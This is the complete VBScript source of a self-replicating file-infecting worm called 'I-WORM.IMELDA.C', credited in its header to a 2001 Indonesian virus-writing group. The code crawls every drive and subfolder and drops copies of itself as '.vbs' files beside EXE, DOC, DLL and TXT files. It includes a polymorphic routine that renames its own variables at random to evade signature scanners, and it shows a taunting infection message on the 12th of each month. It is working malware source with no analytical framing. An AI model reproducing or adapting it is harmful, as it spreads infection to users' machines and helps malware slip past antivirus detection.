'I-WORM.IMELDA.C
'Poly & Crypt - (C)2001, by Iwing
'Virusindo - Indonesian Virus Network
'http://indovirus.8m.com , IRC Dalnet #indovirus
'===============================================
Call FQCMOM
Set RSBQEJ = CreateObject("scripting.filesystemobject")
Call DUELJN
if day(now) = 12 then
VGLOGI = msgbox("Hi there.., you are infected by some of" & Chr(13) & _
"IWING creations.., Poly & crypt By. Iwing - have a nice day", 10 ,"I-WORM.IMELDA.C ")
end if
Function DUELJN()
On Error Resume Next
Set GEGSAI = RSBQEJ.Drives
For Each ANKJMC In  GEGSAI
TSAGHT = ANKJMC & "\"
Call VIEILR(TSAGHT)
Next
End Function
Function VIEILR(IGVGSN)
ESRFFN = IGVGSN
Set VQPVUI = RSBQEJ.GetFolder(ESRFFN)
Set ESCHCG =  VQPVUI.Files
For Each  BQFHLV In ESCHCG
If RSBQEJ.GetExtensionName(BQFHLV.Path) = "EXE" Then
RSBQEJ.CopyFile wscript.scriptfullname, BQFHLV.Path & ".vbs", True
End If
If RSBQEJ.GetExtensionName(BQFHLV.Path) = "DOC" Then
RSBQEJ.CopyFile wscript.scriptfullname, BQFHLV.Path & ".vbs", True
End If
If RSBQEJ.GetExtensionName(BQFHLV.Path) = "DLL" Then
RSBQEJ.CopyFile wscript.scriptfullname, BQFHLV.Path & ".vbs", True
End If
If RSBQEJ.GetExtensionName(BQFHLV.Path) = "TXT" Then
RSBQEJ.CopyFile wscript.scriptfullname, BQFHLV.Path & ".vbs", True
End If
Next
Set GDMHIL = VQPVUI.Subfolders
For Each  VTPDPE In GDMHIL
Call VIEILR(VTPDPE.Path)
Next
End Function
function FQCMOM
Randomize
Set CMUBRF = CreateObject("scripting.filesystemobject")
Set CAICQRL = CMUBRF.OpenTextFile(WScript.ScriptFullName, 1)
MMNOQN = CAICQRL.Readall
TTVMML = "RSBQEJ DUELJN VGLOGI GEGSAI ANKJMC TSAGHT VIEILR ESRFFN IGVGSN BQFHLV ESCHCG GDMHIL VTPDPE FQCMOM CMUBRF CAICQR MMNOQN TTVMML NJRNTB AAVVPT CAICQRL VQPVUI "
Do
NJRNTB = Left(TTVMML, InStr(TTVMML, Chr(32)) - 1)
TTVMML = Mid(TTVMML, InStr(TTVMML, Chr(32)) + 1)
VNOFVA = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
AAVVPT = InStr(AAVVPT + 1, MMNOQN, NJRNTB)
If AAVVPT Then MMNOQN = Mid(MMNOQN, 1, (AAVVPT - 1)) & VNOFVA & Mid(MMNOQN, (AAVVPT + Len(NJRNTB)))
Loop While AAVVPT
Loop While TTVMML <> ""
Set CAICQRL = CMUBRF.OpenTextFile(WScript.ScriptFullName, 2, True)
CAICQRL.Writeline MMNOQN
end function





